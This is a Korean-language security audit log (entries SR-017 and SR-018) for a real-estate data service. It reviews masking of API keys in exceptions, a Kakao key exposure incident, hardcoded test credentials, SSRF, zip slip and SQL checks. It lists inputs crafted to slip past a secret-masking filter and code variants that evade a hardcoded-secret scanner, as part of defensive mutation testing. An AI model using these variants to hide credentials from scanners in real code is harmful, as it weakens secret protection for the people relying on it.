| 검증 스크립트의 rate limit | ✅ | `verify_region_codes.probe:76` 가 월마다 `limiter.wait()` (0.4s + jitter) |
| 실행 간격 실측 | ✅ | `run_ingest --min-interval` 기본 **0.4s(≈2.5 rps)**, geocode 기본 **0.25s(≈4 rps)** — 공공API·카카오 쿼터 대비 보수적 |
| 포털(호가) 수집이 추가됐는가 | ✅ **없음** | 신규 외부 호출은 3곳뿐이며 **전부 공공/공식 API**: 국토부 실거래가, 행정안전부 코드관리시스템(`code.go.kr`), 카카오 로컬(공식 REST). 스크래핑·HTML 파싱 0건 |
| robots fail-closed | ✅ 유지 | `app/ingest/robots.py` 무변경, 미판정 시 거부. 이번 소스들은 공식 API 라 적용 대상 아님 |
| 공공API 만으로 성립하는가(이중화 요구) | ✅ | 이번 라운드 12만 건이 **전부 공공 API 산출물** — G4 의 "포털 꺼도 동작" 요구를 실데이터로 입증한 셈 |

---

### 8) 서버 상태 — **PASS** (조회 전용. 타 실서비스 무변경)

| 점검 | 결과 |
|---|---|
| DB 포트 개방 | ✅ **미개방**. `ss -tlnp` 에 5432 리스너 없음. `docker ps` 의 `realestate-db-1` **Ports 칸 공란** |
| compose 에 `ports:` 추가됐나 | ✅ **없음**. `docker-compose.deploy.yml` 의 유일한 매핑은 `"127.0.0.1:${API_BIND_PORT:-8013}:8000"` (루프백 한정) |
| `.env` 권한 | ✅ `600 root:root` |
| 외부 노출 포트 | 22 / 80 / 443 / **8080** — 8080 은 `autobtc` 컨테이너(타 서비스, 선재). pjt13 은 0.0.0.0 노출 0건 |
| 타 서비스 영향 | ✅ **없음**. `itsmine-*`·`autobtc` 는 `docker ps`·`inspect` 조회만. 중지·재시작·설정변경·파일삭제 **0회** |

---

### 9) 검증용 계정 `verify+recommend@example.invalid` (id=1) — **SR17-6 (low, 비차단)**

| 관점 | 판단 |
|---|---|
| 약한 비밀번호인가 | ❌ 아니다(22자·대소문자·기호). **문제는 강도가 아니라 공개 예정이라는 것** → §5 `SR17-2` 로 승격 |
| 실계정과 혼동되나 | ❌ 낮다. `.invalid` 는 RFC 6761 예약 TLD 라 실제 메일이 갈 수 없고, `verify+` 접두로 의도가 드러난다. **작명은 잘했다** |
| 저장된 데이터가 민감한가 | ❌ 아니다. 현금 8억·소득 1.2억은 CLI 기본값(가공값)이며 `user_profile` 에 **AES-256-GCM 암호문**으로 저장됨(평문 컬럼 0) |
| 잔존 자체의 위험 | ⚠️ 낮음-중간. ① 사용자 수 1 인 시스템에서 **유일한 계정이 테스트 계정**이라 운영 통계·감사 로그가 오염된다 ② `recommendation_job` 2건이 실사용 이력으로 오독될 수 있다 ③ id=1 이 소유자 계정에 배정되지 못한다 |

**의견**: 보안 결함이라기보다 **위생 문제**다. 단 §5 때문에 어차피 손대야 하므로,
**G5 배포 전에 id=1 계정 + 프로필 + job 2건을 삭제**하고 소유자 계정을 첫 사용자로 만들 것을 권고한다.
(파괴적 작업이므로 본 감사자는 실행하지 않았다.)

---

### 10) 그 밖에 확인한 것 (PASS)

| 항목 | 결과 | 근거 |
|---|:--:|---|
| **zip slip** (`fetch_legal_dong_codes.py`) | ✅ **불성립** | `extract()` 가 아카이브 내부 파일명을 **경로로 쓰지 않는다** — `infolist()[0]` 의 내용만 읽어 `--out` 으로 지정된 경로에 쓴다(`:71-74`, `:92`). `z.extract*` 계열 미사용 |
| **SSRF** | ✅ **불성립** | `LIST_URL`·`DOWNLOAD_URL` **하드코딩 상수**(`:37-38`). URL 을 받는 인자·환경변수 없음 |
| 응답 위장 방어 | ✅ | ZIP 매직바이트(`PK`) 확인 + 헤더 문자열 검증 — HTML 오류페이지를 데이터로 저장하지 않음 |
| **SQL 인젝션** | ✅ **0건** | 신규/수정 SQL 전부 `text()` + 바인드 파라미터. 문자열 결합·f-string SQL 0건. `unnest(CAST(:pats AS text[]))`(verify_recommendation.py:70,111)도 파라미터 바인딩. `postgis.py:735` 의 `CAST(:area_m2 AS numeric)` 변경은 **AmbiguousParameter 수정**이지 인젝션 표면 아님 |
| IDOR 회귀 | ✅ 유지 | `repo.get_job(job_id, user.id)` — 2인자 강제 시그니처 무변경 |
| 프롬프트 안전(SR4-2) 회귀 | ✅ 유지 | `orchestrator.py` 변경은 `dong_effect` 창 인자 제거뿐. finding 구성·`assert_no_secrets` 배선 무변경 |
| 자산 암호화 | ✅ 유지 | `verify_recommendation.py` 가 `encrypt_amount(..., user_id, field=...)` 로 AAD 바인딩 유지 |

---

### 신규 발견 요약

| ID | 심각도 | 제목 | 차단 |
|---|:--:|---|:--:|
| `SR17-1` | **high** | MOLIT 인증키가 예외 메시지로 샌다 — 로거 억제로는 못 막고, 그중 하나는 **공개 저장소 커밋 파일**로 들어간다 | **커밋** |
| `SR17-2` | **high** | 운영 DB 에 살아 있는 계정의 비밀번호가 소스에 하드코딩 — 공개 저장소 커밋 예정 (CWE-798) | **커밋** |
| `SR17-3` | medium | `configure_logging` 이 7개 중 2개만 덮음 + 억제가 비밀 보유자가 아닌 호출자 책임 | **커밋** |
| `SR17-4` | low | `mask_sensitive()` 가 문자열에 대해 no-op — SR-006 의 "예외 URL 마스킹 ✅" 기록 정정 | 비차단 |
| `SR17-5` | low | `fetch_legal_dong_codes.py` 응답·압축해제 크기 무제한 (zip bomb) — 메모리 192~256MB 박스 | 비차단 |
| `SR17-6` | low | 검증 계정 id=1 잔존 (위생) | G5 권고 |
| `SR17-7` | info | 서버 `.gitignore` 가 구버전이라 `data/` 미무시 | 비차단 |

### 판정

**FAIL.** 사유는 단순하다 — **이번 라운드의 사고가 "완전히 처리됐다"는 전제가 실측과 다르다.**
로거 억제는 유효한 조치지만 **사고의 절반**이고, 나머지 절반(예외 메시지 → stdout/로그/**커밋 파일**)은
그대로 열려 있다. 게다가 그 열린 경로 중 하나는 **공개 저장소에 영구 기록**되는 곳이다.
여기에 **공개될 예정인 실계정 비밀번호**(SR17-2)가 겹쳐, 이 working tree 는 지금 상태로 커밋되면 안 된다.

서버 위생(잔존 흔적 0), 수집 합법성(G4), DB 미노출, SQL 인젝션, IDOR·암호화 회귀는 **전부 통과**했다.
차단 사유는 **비밀정보 취급 3건에 한정**되며, 셋 다 국소 수정으로 닫을 수 있다.

**PM 조치 요청**: ① 사용자에게 **MOLIT 인증키 재발급** 요청(§1-E · 카카오 키는 불필요)
② `SR17-1`·`SR17-2`·`SR17-3` 수정 후 재감사.

---

## SR-018 · 2026-07-26 · **SR17-1/2/3 수정 재검증 + 카카오 키 노출 사고 + 부동산원/지오코딩 신규 코드** (security-reviewer, herdr re-review 대행)

**판정: PASS** — 차단 0건. SR17-1·SR17-2·SR17-3 **전부 RESOLVED**.
대상: `git log -1`(5703bca) 이후 working tree 전체 — 수정 28 · 신규 21
재현: `cd backend && python -m pytest -q` → **RC=0 · 593 tests / failures 0 / errors 0 / skipped 54 = 539 passed** (junit 실측, 지시 수치와 일치)

> 결론 요약: **초록불을 믿지 않고 부러뜨려 봤다.** 마스킹에 우회 입력 18종, 위생 테스트에 변이 6종,
> SR4-2 그물에 변이 1종을 넣었다. 구조적 방어는 실제로 서 있다. 다만 **수정 자체가 만든 신규 흠 1건**
> (SR18-3 — 유출 비밀번호가 아직 커밋 대상 파일에서 복원 가능)과 low/info 6건을 남긴다.
> 카카오 키 사고는 **저장소·서버 어디에도 흔적이 없음을 실측으로 확인**했고, 그럼에도
> **REST 키 재발급은 필요**하다고 본다(근거는 2절).

---

### 1) SR17-1 — 키가 예외 메시지로 샌다 → **RESOLVED**

#### 1-A. 마스킹 유틸에 우회 입력 18종 투입 → **유출 0건**

`app/core/masking.py` 를 반례로 두들겼다. 실제 실행 결과:

| 입력 형태 | 결과 |
|---|:--:|
| `serviceKey=<KEY>` (원문) | 마스킹됨 |
| `serviceKey%3D<KEY>%26a%3Db` (1회 인코딩) | 마스킹됨 |
| `serviceKey%253D<KEY>%26a%3Db` (2회 인코딩) | 마스킹됨 |
| `{"serviceKey": "<KEY>"}` / `{'serviceKey': '<KEY>'}` (JSON·dict repr) | 마스킹됨 |
| `?key=<KEY>` (쿼리 안의 짧은 이름만) | 마스킹됨 |
| `SERVICEKEY=<KEY>` (대문자) | 마스킹됨 |
| `wrong appKey(<KEY>) format` (**카카오 오류 echo 형태**) | 마스킹됨 (env 리터럴 경로) |
| `Authorization: KakaoAK <KEY>` / `{'Authorization': 'KakaoAK <KEY>'}` | 마스킹됨 |
| 값에 `+ / = %` 가 섞인 base64 키 · 공백/개행/세미콜론 종결 · `repr()` 중첩 따옴표 | 마스킹됨 |
| 평문 문장 안의 키 리터럴(파라미터 이름 없음) | 마스킹됨 (`SECRET_ENV_VARS` 리터럴 치환) |

값 종결 문자 집합(`_VALUE`)이 `+ / = % - _` 를 **값 안에 남기도록** 설계돼 있어, base64 키가 중간에서
잘려 앞부분이 노출되는 흔한 실수가 없다. `_QUERY_RE` 의 `(?<![A-Za-z0-9_])` 선행부정으로
`sort_token=` 류 오탐도 막았다.

#### 1-B. 비밀을 **가진 계층**에서 감싸는가 — 우회 경로 전수

저장소 전체의 직접 httpx 호출은 **4곳뿐**이고 전부 확인했다:

| 위치 | 비밀 보유 | 처리 |
|---|:--:|---|
| `app/ingest/run_molit.py:47` `make_http_fetch` | **인증키(쿼리)** | OK — `masked_error(..., extra_secrets=params의 key/token) from None` |
| `app/ingest/geocode.py:442` `_httpx_get` | **카카오 키(헤더)** | OK — 동일 처리. 헤더에서 키 값을 뽑아 `extra_secrets` 로 전달 |
| `app/agents/llm.py:61` Anthropic | ANTHROPIC 키(헤더) | OK — 구조적 안전. 오류 시 `status=` 만 담아 `LLMError` 로 올리고 **본문·URL 미포함** |
| `scripts/fetch_legal_dong_codes.py:48` · `scripts/fetch_reb_complex_master.py:95` | **없음**(무인증 공개 다운로드) | OK — 유출 대상 없음 |

**신규 코드가 뚫는 우회로는 없다.** `reb.py` 는 순수 파서로 네트워크 호출 0건이고,
`fetch_reb_complex_master.py` 는 인증이 없는 포털 파일 다운로드다(키를 아예 안 쥔다).
주소 지오코딩(`KakaoAddressSearch`)은 키워드검색과 **같은 `_httpx_get`** 을 탄다.

키 없이 실행해도 안전함을 실증(`ConnectError` 경로):

```
_httpx_get('http://127.0.0.1:9/x', {'Authorization': 'KakaoAK <32자키>'}, ...)
  -> SecretSafeError / leaks: False
```

#### 1-C. 이중·삼중 그물

- `runner.py:129 _why()` 가 `service_key` 리터럴로 **재마스킹**(주입된 fetch 가 무엇이든 경계를 못 넘음)
- `verify_region_codes.probe():82` 가 동일 재마스킹 → `classify()` → `render()` 직전 문서 전체 재마스킹
- `install_log_masking()` = 레코드 팩토리 + 핸들러 `SecretMaskingFilter`(**`exc_text` traceback 까지**)

실행 검증 — 루트 로거를 DEBUG 로 열고 httpx INFO 를 직접 발생시켜도 새지 않는다:

```
INFO:httpx:HTTP Request: GET https://apis.data.go.kr/x?serviceKey=*** "HTTP/1.1 200 OK"
ERROR:probe:수집 실패
  ... SecretSafeError: MOLIT 요청 실패: HTTPStatusError: Client error '403' for url '...serviceKey=***&LAWD_CD=1'
LOGBUF LEAKS KEY: False
```

#### 1-D. `raise ... from None` 은 `__context__` 를 **끊지 않는다** (신규 SR18-1, low)

지시받은 항목이라 실행으로 확인했다. 결과는 **보고와 다르다**:

```
type        : SecretSafeError
__cause__   : None
__context__ : HTTPStatusError("... serviceKey=SUPERSECRETKEY1234567890== ...")   <- 원문 보유
traceback   : LEAKS KEY = False    <- 표준 포매팅은 __suppress_context__ 를 존중해 출력 안 함
체인 순회    : LEAKS RAW = True     <- __context__ 를 따라가는 리포터라면 다시 보인다
```

`from None` 은 `__cause__=None` + `__suppress_context__=True` 를 설정할 뿐 **`__context__` 는 그대로 남는다.**
`traceback`·`logging` 은 이를 존중하므로 **실사용 경로에서의 유출은 없다**(위 실측). 그러나
`masking.py:167-168` 의 주석 "원본 예외는 **체인에서 끊는다**" 는 **사실이 아니다** — 여기서 정정한다.
SR-006 → SR17-4 에서 "마스킹이 있다"는 잘못된 기록이 판단을 흐렸던 것과 같은 종류의 위험이다.
※ 운영에서는 `MOLIT_API_KEY` 가 프로세스 env 에 있어 리터럴 치환이 한 겹 더 걸린다.

**조치(low)**: `masked_error()` 안에서 `exc.__context__ = None` 을 명시하거나, 주석을
"끊는다" → "표준 포매팅에서 억제된다" 로 정정. 둘 중 하나면 된다.

#### 1-E. DSN 비밀번호는 **env 존재에 의존**한다 (신규 SR18-2, low)

`main.py` 는 "SQLAlchemy 예외는 DSN(비밀번호 포함)을 담는다"며 `install_log_masking()` 을 건다.
그런데 `mask_secrets` 에 **DSN 모양 정규식이 없다** — `POSTGRES_PASSWORD` 가 그 프로세스 env 에
실려 있을 때만 리터럴로 지워진다. 실측:

```
env 있음 : postgresql+psycopg://realestate:***@172.19.0.2:5432/realestate
env 없음 : postgresql+psycopg://realestate:Pg-Secret-1234567890@172.19.0.2:5432/realestate   <- 유출
```

API 컨테이너는 env 가 실리므로 현재 실害는 없다. 다만 `DATABASE_URL` 만 주고 `POSTGRES_PASSWORD` 를
안 주는 실행 형태(스크립트에서 흔하다)에서는 보호가 사라진다.
**조치(low)**: `_common.safe_dsn` 의 `://([^:/@]*):[^@]*@` 정규식을 `mask_secrets` 안으로 옮긴다.

#### 1-F. 회귀 테스트가 진짜인가 — 변이 M5

`_EQ` 에서 URL 인코딩 지원(`%3D`/`%253D`)을 제거 → `test_masks_url_encoded_forms` **FAIL**.
테스트가 실제 동작을 붙잡고 있다. (주의: `masking.py` 는 미추적 파일이라 `git checkout` 이 통하지 않는다 —
변이 후 원본 정규식으로 직접 복원했고, 복원 후 전체 593 tests / failures 0 으로 동일성 확인)

---

### 2) 카카오 REST 키 1회 노출 — **흔적 0건 · 그럼에도 재발급 필요**

#### 2-A. 흔적 조사 (서버·저장소, 조회 전용)

키 값을 화면에 찍지 않고 변수로만 다뤄 스캔했다(원문 + `quote`/`quote_plus`/`unquote`/소문자 hex 변형).

| 대상 | 결과 |
|---|:--:|
| 서버 파일시스템 `/opt /root /home /tmp /var/tmp /var/log /etc /srv /var/lib/docker/containers` | **`/opt/realestate/.env` 1건뿐** (600 root:root) |
| `/root/.bash_history` (20,636B) | **0건**. mtime **2026-07-02** — 비대화형 ssh 는 history 를 안 남긴다. "출력은 세션 기록에만 남았다"는 보고와 정합 |
| `journalctl --since -7days` (appkey/kakao) | **0건** |
| `docker logs realestate-db-1` | **0건** |
| `/var/log/nginx/*` | **0건** |
| `git rev-list --all` 전 이력 (KAKAO_REST · KAKAO_JS · MOLIT 3종) | **0건** |
| 커밋 대상 파일 실값 대조 — 로컬 224개 / 서버 222개, 비밀 6종(KAKAO×2·MOLIT·POSTGRES_PASSWORD·JWT_SECRET·FIELD_ENCRYPTION_KEY) + 인코딩 변형 | **0건** |

`config/region_code_verification.yaml`(신규 커밋 대상) 재확인: `summary.error: 0`, URL 은 공개 엔드포인트 1건, 키 흔적 0.

#### 2-B. 재발급 판단 — **REST 키 YES · JS 키 NO**

| 키 | sha256[:12] | 판단 | 근거 |
|---|---|:--:|---|
| `KAKAO_REST_API_KEY` | `8e1d324dc6af` | **재발급 필요** | 우리 코드는 이 값을 `Authorization: KakaoAK <키>` 로 보낸다. 카카오의 `wrong appKey(<값>) format` 은 **보낸 값을 그대로 되돌려주는** 오류다 → 화면에 찍힌 값은 REST 키다. 서버 전용 비밀이며 도메인 제한 같은 보완 통제가 **없다**. 노출면은 파일이 아니라 **우리가 소유·파기 확인을 못 하는 세션 기록**이다. "누가 봤는지 증명 못 하면 회전한다"가 원칙이고, 비용은 콘솔 재발급 + `.env` 한 줄 |
| `KAKAO_JS_APP_KEY` | `4386ba299da6` | **재발급 불필요** | **REST 키와 다른 값임을 해시로 확인**(js_eq_rest=NO). 이번 사고에 전송되지 않았다. 게다가 JS 키는 설계상 브라우저로 나가는 공개 키다(`frontend/dist` 포함 — SR-013 에서 정상으로 확인). 실효 통제는 **카카오 콘솔의 플랫폼 도메인 허용목록**이다 |

**함께 확인할 것**

1. 카카오 콘솔이 **앱 단위로만** 키를 재발급하는 경우 JS 키도 함께 바뀐다 → `frontend/.env` 갱신 + **프론트 재빌드** 필요.
2. JS 키의 **플랫폼 도메인 허용목록**이 배포 도메인만 등록돼 있는지 확인(미등록 = 누구나 우리 쿼터 사용).
3. **`MOLIT_API_KEY` 재발급(SR-017 요청)이 아직 미이행이다.** 서버 `.env` mtime = **2026-07-25 22:20**
   (SR-017 작성 시각 07-26 00:20 이전) → 이후 갱신 없음. 두 키를 한 번에 처리 권고.

#### 2-C. 재발 방지 — 코드가 아니라 **운영 절차**로

우리 마스킹은 파이썬 프로세스 안에서만 작동한다. **원격 셸의 `curl` 출력은 덮지 못한다.**
그러니 코드로 더 막으려 하지 말고 절차로 굳혀야 한다. `deploy/DEPLOY.md` 에 명문화 권고:

1. **원격에서 API 형식 확인은 우리 스크립트로만.** `verify_region_codes.py` / `geocode_complexes.py --dry-run`
   은 이미 마스킹 경로다. 임시 `curl` 은 금지.
2. 부득이한 `curl` 은 **본문을 보지 않는다**: `curl -sS -o /dev/null -w '%{http_code}\n' ...` 로 상태코드만.
   본문이 필요하면 반드시 출력 필터를 건다(32자 hex·`serviceKey=` 값을 `sed` 로 `***` 치환).
3. **키를 명령줄에 붙여넣지 않는다**: `set -a; . /opt/realestate/.env; set +a` 후 `$KAKAO_REST_API_KEY` 참조.
   명령줄에 값이 안 남아 `ps`·history·에러 echo 노출면이 함께 줄어든다.
4. **키 회전 절차를 체크리스트로**: 콘솔 재발급 → `.env` 수정 → `docker compose up -d` → 검증 스크립트 1회 →
   구 키 폐기 확인. 지금은 절차가 없어 SR-017 의 재발급 요청이 미이행 상태로 남아 있다.

---

### 3) SR17-2 — 하드코딩 자격증명 → **RESOLVED** (단, 신규 SR18-3)

#### 3-A. 수정 확인

- `TEST_PASSWORD` 상수 **제거**. `make_test_password()` = `"Vr1!" + secrets.token_urlsafe(24)`,
  `VERIFY_TEST_PASSWORD` env 우회 지원, **생성값을 출력하지 않는다**.
- `purge_user()` 가 `.invalid`(RFC 6761/2606 예약 TLD) 이외 주소를 **engine 에 닿기 전에** `SystemExit`.
  파괴적 경로를 문법으로 막았다 — 테스트로 고정됨.
- **운영 DB 정리 완료(직접 조회)**: `app_user` **0행** · `user_profile` **0** · `recommendation_job` **0**.
  백업은 저장소 밖 `/root/realestate-backup/sr17-2_user_rows_20260726-074659.sql`(디렉터리 700).
  → **SR17-6(검증 계정 잔존)도 함께 CLOSE.**
- 변이 M1(`TEST_PASSWORD = "..."` 재도입) → **3개 테스트 동시 FAIL**. 그물이 실제로 작동한다.

#### 3-B. 그런데 유출된 비밀번호가 **아직 커밋 대상 파일에서 복원된다** (SR18-3, medium, 비차단)

`backend/tests/test_script_hygiene.py:94`:

```python
leaked_marker = "<앞조각>" + "<뒷조각>"    # ← 이렇게 쪼개도 이어붙이면 원본이다(SR18-3)
```

문자열 연결은 **파싱 시점에 합쳐진다.** 이 줄을 읽는 사람에게 값은 그대로 보인다.
쪼갠 이유는 오직 **이 테스트의 자기 자신 검사에 걸리지 않기 위해서**다 —
즉 검사기가 **구조적으로 자기를 면제**한다(`.py` 를 스캔 대상에 넣어 놓고도 자기는 통과).
origin 은 공개 저장소이고 커밋은 되돌릴 수 없다.

**차단하지 않은 이유(판단 근거를 남긴다)**: SR17-2 의 차단 논거는 "**동작하는** 자격증명 공개"였다.
그 계정은 지금 없다(위 3-A, 직접 조회). 인증 표면이 사라졌으므로 CWE-798 이 아니라
**정보노출(CWE-200)** 로 강등된다. 남는 실질 위험은 **비밀번호 패턴 노출**
(`<용도>-<단어>-<연도>!`)과 **재사용 가능성**뿐이다.

**→ 사용자 결정 필요**: 이 값을 **다른 곳에 재사용한 적이 있다면 이 항목은 즉시 차단으로 올라간다.**
없다면 push 전에 아래 1줄만 고치면 된다.

**조치(권고, G5 전 필수)**: 값을 파일에 적지 말고 해시로 비교한다 — 금지값의 `sha256` 지문만 커밋하고
파일 안의 토큰을 훑어 지문이 일치하면 FAIL. 또는 금지값을 미추적 파일/환경변수로 읽는다.
어느 쪽이든 **자기면제가 사라진다.**

#### 3-C. 정적 검사의 실효성 — 변이 6종 중 **6종 미탐지** (SR18-5, low)

`test_no_hardcoded_secret_literals_in_app_and_scripts` 는 `NAME = "리터럴"` 형태만 본다.
아래를 `scripts/ingest_report.py` 에 주입했더니 **7개 테스트 전부 초록**이었다:

| 변형 | 탐지 |
|---|:--:|
| `CONFIG = {"password": "Sup3rS3cret..."}` (dict 값) | 미탐지 |
| `CREDS = ("admin", "Sup3rS3cret...")` (튜플 값) | 미탐지 |
| `DB_PASSWORD = "Sup3r" + "S3cret..."` (문자열 연결) | 미탐지 |
| `_p = "Sup3rS3cret..."` (이름이 규칙에 안 걸림) | 미탐지 |
| `API_KEY_LIVE = f"sk-live-{...}"` (f-string) | 미탐지 |
| `dict(password="Sup3rS3cret...")` (키워드 인자) | 미탐지 |

세 번째 변형(문자열 연결)이 **정확히 SR18-3 에서 쓰인 우회 기법**이다 — 작성자가 구멍을 알고 썼다.
지금 실제 위반은 없으므로 low. **조치**: dict 값·키워드 인자·`BinOp` 문자열 연결을 AST 검사에 추가하고,
고엔트로피 문자열 일반 스캔을 한 겹 얹는다.

---

### 4) SR17-3 — 억제가 호출자 책임 → **RESOLVED**

- `scripts/_common.py:130` 이 **import 부작용으로** `configure_logging()` 실행
  → `basicConfig` + `httpx/httpcore/urllib3/anthropic` WARNING + `install_log_masking()`.
- **스크립트 13개 전수 확인: 13/13 이 `from _common import` 를 탄다.** 빠진 것 없음.
- `app/main.py` `create_app()` → `install_log_masking()`. `app/worker.py` → 레벨 억제 + `install_log_masking()`.
- 변이로 실효성 확인:
  - M2 `from _common import` → `from _common  import`(공백 1개) → `test_every_script_goes_through_common_entrypoint` **FAIL**
  - M3 `_common` 의 import 시점 `configure_logging()` 주석 처리 → `test_common_installs_masking_on_import` **FAIL**
  - `test_no_script_configures_logging_without_common` 이 `basicConfig` 직접 호출도 차단

**잔여(SR18-4, low)**: `print()` 는 마스킹 그물 **밖**이다. 현재 예외를 찍는 `print` 3곳은 전부
`mask_secrets` 또는 마스킹된 예외 타입을 거치므로(전수 grep) 실害 0. 다만 이 보장은 **구조가 아니라 관습**이다.
`fetch_reb_complex_master.check_header` 는 응답 앞 200바이트를 그대로 찍는데, 그 엔드포인트는 무인증이라 현재 무해.

---

### 5) 신규 코드 보안 (3순위)

#### 5-A. 외부 파일 다운로드 — `reb.py` · `fetch_reb_complex_master.py`

| 항목 | 결과 | 근거 |
|---|:--:|---|
| **SSRF (메타 응답을 따라가나)** | **불성립** | 2단계를 타지만 **URL 은 안 따라간다.** `META_URL`·`FILE_URL` 이 하드코딩 상수(`:47-48`)이고, 메타 응답에서 취하는 값은 `atchFileId`·`fileDetailSn` **둘뿐**이며 httpx `params=` 의 **쿼리 값으로만** 쓴다(`:120-123`). 응답이 URL 을 주더라도 요청 대상이 바뀌지 않는다. URL 을 받는 인자·환경변수도 없다 |
| **zip slip / 경로탈출** | **불성립** | 이 스크립트는 **압축을 풀지 않는다.** 응답 바이트를 `out_dir / ds.filename`(**상수**)에 그대로 기록(`:159-160`). 아카이브에서 온 문자열이 경로에 들어가는 지점 0 |
| **응답 위장** | OK | `check_header()` 가 헤더 첫 줄의 필수 컬럼을 확인하고 **불일치면 저장하지 않는다** — 200 으로 오는 오류 HTML 을 데이터로 적재하지 않음 |
| **URL 하드코딩** | 의도적 | 갱신마다 바뀌는 `atchFileId` 를 박지 않으려 메타 조회를 두는 설계. 판단 타당 |
| **응답 크기 제한** | **없음** (SR18-6, low) | `resp.content` 를 상한 없이 메모리 적재 + `follow_redirects=True`. SR17-5(`fetch_legal_dong_codes`)와 동종이고 대상이 더 크다(실측 `data/` 52MB). 완화: URL 하드코딩 + 사람이 수동 실행 + 호스트 실행(컨테이너 192MB 밖). 권고: 스트리밍 + 누적 100MB 상한 |
| `reb.py` 자체 | OK | **순수 파서, 네트워크 0.** `decode_csv` 는 한글이 안 보이면 성공으로 치지 않음(깨진 데이터 무단 적재 방지). `parse_pnu` 는 19자리 숫자 아니면 추측 없이 `None` |

#### 5-B. 마이그레이션 007 · 008 — 정적 DDL, 이상 없음

사용자 입력이 섞이는 지점 **0**. 전부 리터럴 DDL 이다. 오히려 방어가 늘었다:
`complex_geom_confidence_chk`(값 오염 차단) · `complex_reb_match_pair_chk`(한쪽만 채우는 스크립트 버그를
데이터가 아니라 **스키마가** 막음). 파티션(`trade`)·자연키(004)·007 미변경. FK/UNIQUE 미부여 사유도 주석에 명시.

#### 5-C. 신규 SQL 전수 — **문자열 포매팅 0건**

- 전 신규 스크립트의 SQL 은 `text()` + 바인드. `match_reb_complexes.py` 의 **대량 UPDATE** 는
  `conn.execute(text(_UPDATE_MATCH), updates[i:i+1000])` — executemany 파라미터 바인딩(`:reb_id`·`:method`·`:id`).
  `_SELECT_REB` 도 `{"kinds": list(kinds)}` 바인드.
- f-string 이 들어간 SQL 은 **2곳뿐이고 둘 다 하드코딩 상수 식별자**다:
  `geocode_complexes.py:117,121` ← `table = "backup.complex_geom_pre_geo1"`(리터럴, argparse 미노출) ·
  `postgis.py:892 _POIS_SQL` ← SQL 상수 조립. **외부 입력 경로 없음.**

#### 5-D. SR4-2 회귀 — 없음 (변이로 확인)

`assert_no_secrets` 배선(`orchestrator.py:468`) · `_derive_forbidden` 보강 · `portfolio_summary` 의
빈 forbidden fail-loud 전부 유지. **변이 M6**: `finance_finding` 의 rationale 에 `usable_cash_krw` 원본을
주입 → `test_파이프라인_프롬프트에_자산금액이_없다` 등 **2건 FAIL**(`PromptSafetyError`). 그물이 실제로 작동한다.
실거래 기준 후보(`price_basis="trade"`)는 시세·면적·거래건수만 싣고 **사용자 자산이 들어가는 지점 0**.

#### 5-E. IDOR — 회귀 없음

`repo.get_job(job_id, user.id)` 2인자 강제 시그니처가 `base`·`memory`·`postgis` 전부 동일하게 유지.
`base.py:12` 의 "`get_job(job_id)` 같은 시그니처는 만들지 않는다" 원칙 무변경.

#### 5-F. G4 rate limit — 신규 경로도 준수 (관찰 1건)

모든 카카오 호출 앞에 `self._limiter.wait()`(키워드 `:481` · **주소 `:539`**). 기본 0.3s/jitter 0.2s.
`verify_region_codes` 0.4s, `run_ingest`·`verify_reb_matching` 는 인자. 신규 외부호출은 전부 공공/공식 API
(국토부 · code.go.kr · data.go.kr 파일데이터 · 카카오 로컬)이고 **HTML 스크래핑 0건**.

**SR18-7 (info)**: `geocode_complexes.py:190 _limiter()` 가 키워드용·주소용에 **별개 인스턴스**를 만든다
(`return RateLimiter(...)`). 한 단지가 두 경로를 다 타면 실효 간격이 절반이 된다
(기본 `--min-interval 0.25` 기준 최대 약 8req/s). 카카오 쿼터 안이지만 **의도한 간격은 아니다.**
권고: 인스턴스 1개를 두 검색기가 공유.

#### 5-G. 서버 — 유지

- `ss -tlnp`: **5432 리스너 없음**. `docker ps`: `realestate-db-1` **Ports 공란**.
- `docker-compose.yml`·`docker-compose.deploy.yml` **무변경**(`git diff` 공백). `db`·`redis` 에 `ports:` 없음.
  유일 매핑은 `127.0.0.1:${API_BIND_PORT:-8013}:8000`.
- `/opt/realestate/.env` **600 root:root**.
- 타 실서비스(`itsmine-*`·`autobtc`)는 **조회만** 수행 — 중지·재시작·설정변경·삭제 **0회**.

---

### 6) 기타 관찰

| ID | 심각도 | 내용 |
|---|:--:|---|
| `SR18-8` | info | `backend/docs/03-build/.review-state.json` (신규 미추적, 305B) — 저장소 루트 정본과 **다른 위치의 중복 게이트 파일**(`{"status":"ran"}` 뿐). 비밀은 없으나 게이트 훅이 어느 쪽을 읽느냐로 판정이 갈릴 수 있다. **커밋 전 삭제 권고** |
| `SR17-7` | info(유지) | 서버 `.gitignore` 가 구버전 → `data/reference/legal_dong_code_full.txt` 미무시(`.csv` 는 이미 무시됨). 공개 정부자료라 비밀 아님. 이번 커밋 pull 로 해소 |
| `SR17-5` | low(유지) | `fetch_legal_dong_codes.py` 응답·압축해제 크기 상한 여전히 없음 |
| `SR15-4` | **G5 차단(유지)** | CSP 헤더 부재 — nginx 에 HSTS·nosniff·X-Frame-Options·Referrer-Policy 4종만 |
| `SR15-3`/R-09 | low(유지) | 서버측 토큰 폐기 수단 — SR-016 재평가 그대로 |

---

### 신규 발견 요약

| ID | 심각도 | 제목 | 차단 |
|---|:--:|---|:--:|
| `SR18-3` | **medium** | 유출 비밀번호가 `test_script_hygiene.py:94` 에서 **여전히 복원 가능** — 검사기가 자기를 면제한다 | 비차단(**G5 전 필수** · 재사용 이력 있으면 즉시 차단) |
| `SR18-1` | low | `raise ... from None` 이 `__context__` 를 끊지 않는다 — 주석의 "끊는다"는 사실이 아님(표준 포매팅에서 억제될 뿐) | 비차단 |
| `SR18-2` | low | `mask_secrets` 에 DSN 정규식 부재 — DSN 비밀번호 보호가 `POSTGRES_PASSWORD` env 존재에 의존 | 비차단 |
| `SR18-4` | low | `print()` 는 마스킹 그물 밖 — 현재 실害 0이나 보장이 구조가 아니라 관습 | 비차단 |
| `SR18-5` | low | AST 비밀 리터럴 검사가 dict·튜플·문자열연결·f-string·kwarg·비규칙명을 **전부 놓친다**(변이 6/6 미탐지) | 비차단 |
| `SR18-6` | low | `fetch_reb_complex_master.py` 응답 크기 상한 없음 + `follow_redirects=True` | 비차단 |
| `SR18-7` | info | `geocode_complexes` 가 rate limiter 인스턴스를 2개 만들어 실효 간격이 절반 | 비차단 |
| `SR18-8` | info | `backend/docs/03-build/.review-state.json` 중복 게이트 파일 | 비차단 |

### CLOSE 처리

`SR17-1` **RESOLVED** · `SR17-2` **RESOLVED** · `SR17-3` **RESOLVED** ·
